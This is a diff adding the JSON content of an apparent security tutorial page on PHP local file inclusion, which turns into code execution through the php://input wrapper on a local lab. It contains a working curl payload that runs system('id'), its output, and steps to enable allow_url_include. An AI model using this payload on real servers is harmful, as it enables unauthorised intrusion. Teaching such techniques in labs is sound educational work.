@@ -1,0 +1,82 @@
+[
+    {
+        "id": "download-lfi-lab",
+        "type": "download",
+        "title": "LFI Practice Lab",
+        "text": "Download the vulnerable PHP lab and payload collection.",
+        "fileName": "lfi-input-lab.zip",
+        "url": "/downloads/lfi-input-lab.zip",
+        "size":"4kb"
+    },
+    {
+        "type": "section_heading",
+        "id": "filter-lfi",
+        "text": "Filter Input - LFI"
+    },
+    {
+        "type": "explanation",
+        "id": "lfi-filter-intro",
+        "title": "php://input",
+        "items": [
+            "It is just a <highlight>PHP stream wrapper</highlight>",
+            "It contains the <highlight>raw HTTP request body</highlight>"
+        ]
+    },
+    {
+        "type": "order_block",
+        "id": "lfi-step-1",
+        "text": "Let's look at a basic example."
+    },
+    {
+        "type": "code_block",
+        "id": "example-rce-request",
+        "code": "curl -X POST \"http://127.0.0.1:4000/secret-script.php?file=php://input\" -H \"Content-Type: text/plain\" --data '<?php echo \"RCE_WORKING\\n\"; system(\"id\"); ?>'"
+    },
+    {
+        "type": "explanation",
+        "id": "lfi-filter-understanding",
+        "title": "Understanding the Command",
+        "items": [
+            "Here we used <highlight>php://input</highlight> which serves the raw request body.",
+            "It must be a <highlight>POST</highlight> request.",
+            "The vulnerable file must use <highlight>include()</highlight> or <highlight>require()</highlight> on user-controlled input.",
+            "Content-Type should be <highlight>text/plain</highlight> to avoid PHP consuming the body as form data.",
+            "The PHP code inside --data will only execute if <highlight>include()</highlight> processes php://input and <highlight>allow_url_include</highlight> is enabled."
+        ]
+    },
+    {
+        "type": "order_block",
+        "id": "lfi-step-2",
+        "text": "Now let's look at the output of the above command."
+    },
+    {
+        "type": "output_block",
+        "id": "example-rce-output",
+        "code": "RCE_WORKING uid=1000(azid) gid=1000(azid) groups=1000(azid),4(adm),20(dialout)..."
+    },
+    {
+        "type": "order_block",
+        "id": "lfi-step-3",
+        "text": "Sometimes PHP stream wrappers are disabled. You need to check the configuration."
+    },
+    {
+        "type": "code_block",
+        "id": "check-allow-url-include",
+        "code": "php -i | grep allow_url_include"
+    },
+    {
+        "type": "order_block",
+        "id": "lfi-step-4",
+        "text": "If the result shows Off, then wrapper-based RCE will not work. On real targets you cannot change this setting. On a local lab machine you can modify it for learning purposes."
+    },
+    {
+        "type": "code_block",
+        "id": "edit-php-ini",
+        "code": "sudo nano /etc/php/*/cli/php.ini"
+    },
+    {
+        "type": "order_block",
+        "id": "lfi-step-5",
+        "text": "Change <highlight>allow_url_include = Off</highlight> to <highlight>allow_url_include = On</highlight> and restart the PHP server."
+    }
+]
